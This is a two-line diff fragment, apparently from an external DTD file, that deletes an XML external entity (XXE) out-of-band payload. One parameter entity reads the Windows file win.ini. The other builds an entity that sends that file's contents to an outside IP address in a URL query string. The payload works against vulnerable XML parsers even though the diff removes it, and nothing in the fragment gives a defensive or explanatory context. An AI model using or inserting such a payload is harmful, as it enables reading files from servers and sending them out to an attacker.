@@ -1,2 +1,0 @@
-<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://159.65.28.225:443/?%data;'>"> 
